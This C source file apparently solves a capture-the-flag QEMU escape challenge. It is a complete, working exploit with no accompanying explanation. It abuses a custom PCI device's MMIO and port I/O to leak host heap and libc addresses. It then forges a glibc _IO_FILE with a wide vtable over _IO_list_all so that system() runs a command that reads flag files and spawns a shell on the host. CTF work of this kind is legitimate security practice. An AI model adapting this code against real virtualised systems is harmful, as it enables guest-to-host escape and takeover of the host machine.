// gcc exploit_qemu.c -o exploit_qemu

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

#define PORT_SET_COMMAND 0
 
#define CMD_STORE_GETKEY 0x10
#define CMD_STORE_PAGE   0x11
#define CMD_STORE_FIN    0x12
#define CMD_LOAD_SETKEY  0x20
#define CMD_LOAD_PAGE    0x21
#define CMD_LOAD_FIN     0x22

#define PIO_BASE 0xc030
#define PORT_OUT(addr, val) (outb((val), PIO_BASE + (addr)))
#define PORT_IN(addr)       (inb(PIO_BASE + (addr)))

static uint32_t store_getkey(uint32_t len);
static void store_page(uintptr_t paddr, uint32_t pgoff);
static void store_fin(void);
static uint32_t load_setkey(uint32_t key);
static uint32_t load_page(uintptr_t paddr);
static void load_fin(void);

static uintptr_t virt2phys(uintptr_t addr);
static void dump(void *buf, size_t size);

#define OFFSET(addr)	((addr) - (TEXT_BASE))
#define ADDR(offset)	(addr_libc_base + (offset))

uintptr_t addr_libc_base = 0;
const uint64_t ofs_libc_system         = 0x050d60;
const uint64_t ofs_libc_mainarena      = 0x219c80;
const uint64_t ofs_libc_io_list_all    = 0x21a680;
const uint64_t ofs_libc_io_wfile_jumps = 0x2160c0;

struct _IO_FILE_plus
{
  struct _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  char _codecvt[0x70];

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};

struct reg_mmio {
	uint64_t sdma_addr;
	uint32_t key;
	union {
		uint32_t len;
		uint32_t pgoff;
	};
	uint32_t addr_ram;
};

static struct reg_mmio *mmio;

int main(int argc, char *argv[]){
	int mmio_fd;
	void *vmem;
	uint32_t buf[0x10];

	if(ioperm(PIO_BASE, 4, 1)){
		perror("ioperm");
		return -1;
	}

	if((mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource1", O_RDWR|O_SYNC)) == -1){
		perror("open mmio");
		return -1;
	}

	if((mmio = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mmio_fd, 0)) == MAP_FAILED){
		perror("mmap mmio");
		return -1;
	}

	if((vmem = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0)) == MAP_FAILED){
		perror("mmap anon");
		return -1;
	}
	uintptr_t pmem = virt2phys((uintptr_t)vmem);

	uintptr_t addr_ram = mmio->addr_ram;

	uint32_t key = store_getkey(7);
	store_page(-1, 0xdead);
	store_fin();

	load_setkey(key);
	for(int i=0; i<0x10; i++)
		buf[i] = load_page(-1);
	dump(buf, sizeof(buf));

	uintptr_t addr_heap_arena_t1 = ((uint64_t*)buf)[6] & ~((1<<24)-1) + 0x30;

	addr_ram |= addr_heap_arena_t1 & ~((1UL<<32)-1);
	printf("[+] addr_ram       = %p\n", (void*)addr_ram);

	mmio->addr_ram = addr_heap_arena_t1 & ~((1<<12)-1);
	load_page(pmem);
	uintptr_t addr_heap_arena_t2  = *(uintptr_t*)(vmem+0x30+0x870); // next

	mmio->addr_ram = addr_heap_arena_t2 & ~((1<<12)-1);
	load_page(pmem);
	uintptr_t addr_libc_mainarena = *(uintptr_t*)(vmem+0x30+0x870); // next

	addr_libc_base = addr_libc_mainarena - ofs_libc_mainarena;
	printf("[+] addr_libc_base = %p\n", (void*)addr_libc_base);
	const uintptr_t addr_libc_system         = ADDR(ofs_libc_system);
	const uintptr_t addr_libc_io_list_all    = ADDR(ofs_libc_io_list_all);
	const uintptr_t addr_libc_io_wfile_jumps = ADDR(ofs_libc_io_wfile_jumps);

	mmio->addr_ram = addr_libc_io_list_all & ~((1<<12)-1);
	load_page(pmem);
	load_fin();

	store_getkey(2);

	*(uint64_t*)(vmem + (addr_libc_io_list_all&0xfff)) = addr_ram;
	store_page(pmem, 0xcafe);

	/*
	 * _IO_flush_all_lockp
	 *     fp._mode > 0
	 *     fp._wide_data->_IO_write_ptr > fp._wide_data->_IO_write_base
	 * __GI__IO_wfile_overflow
	 *     fp._flags & (_IO_NO_WRITES(0x8)| _IO_CURRENTLY_PUTTING(0x800)) == 0
	 *     fp._wide_data->_IO_write_base == 0
	 * __GI__IO_wdoallocbuf
	 *     fp._flags & _IO_UNUFFERED(0x2) == 0
	 */

	struct fake_files {
		struct _IO_FILE_plus file_plus;
		struct _IO_wide_data wide_data;
		uintptr_t wide_vtable[21];
		uint64_t lock;
	} ff = {
		.file_plus = {
			.file = {
				._flags     = 0xfbad2086 & ~0x80a,
				._lock      = (void*)&((struct fake_files*)addr_ram)->lock,
				._wide_data = (void*)&((struct fake_files*)addr_ram)->wide_data,
				._mode      = 1,
			},
			.vtable = (void*)addr_libc_io_wfile_jumps,
		},
		.wide_data = {
			._IO_write_base = (void*)0,
			._IO_write_ptr  = (void*)1,
			._wide_vtable   = (void*)&((struct fake_files*)addr_ram)->wide_vtable,
		},
		.wide_vtable = {
			[13] = addr_libc_system,
		},
		.lock = 0,
	};

	memcpy(vmem, &ff, sizeof(ff));
	strcpy(vmem+4, ";exec <&2 >&2;cat flag*;sh");

	mmio->addr_ram = addr_ram;
	store_page(pmem, 0xbabe);

	store_fin();

	munmap(vmem, 0x1000);
	munmap(mmio, 0x1000);
	close(mmio_fd);

	ioperm(PIO_BASE, 4, 0);

	system("reboot");

	return 0;
}

static uint32_t store_getkey(uint32_t len){
	mmio->len = len;
	PORT_OUT(PORT_SET_COMMAND, CMD_STORE_GETKEY);
	return mmio->key;
}

static void store_page(uintptr_t paddr, uint32_t pgoff){
	mmio->sdma_addr = paddr;
	mmio->pgoff = pgoff;
	PORT_OUT(PORT_SET_COMMAND, CMD_STORE_PAGE);
}

static void store_fin(void){
	PORT_OUT(PORT_SET_COMMAND, CMD_STORE_FIN);
}

static uint32_t load_setkey(uint32_t key){
	mmio->key = key;
	PORT_OUT(PORT_SET_COMMAND, CMD_LOAD_SETKEY);
	return mmio->len;
}

static uint32_t load_page(uintptr_t paddr){
	mmio->sdma_addr = paddr;
	PORT_OUT(PORT_SET_COMMAND, CMD_LOAD_PAGE);
	return mmio->pgoff;
}

static void load_fin(void){
	PORT_OUT(PORT_SET_COMMAND, CMD_LOAD_FIN);
}


static uintptr_t virt2phys(uintptr_t addr){
	static int map_fd = -1;
	uintptr_t base;

	if(map_fd < 0)
		map_fd = open("/proc/self/pagemap", O_RDONLY);

	lseek(map_fd, sizeof(uintptr_t)*(addr >> 12), SEEK_SET);
	if(read(map_fd, &base, sizeof(uintptr_t)) < sizeof(uintptr_t))
		return -1;
	
	if(!(base & (1UL<<63)))
		return -1;

	base <<= 12;
	printf("virt : 0x%016lx -> phys : 0x%016lx\n", addr & ~((1<<12)-1), base);

	return base | (addr & ((1<<12)-1));
}

static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
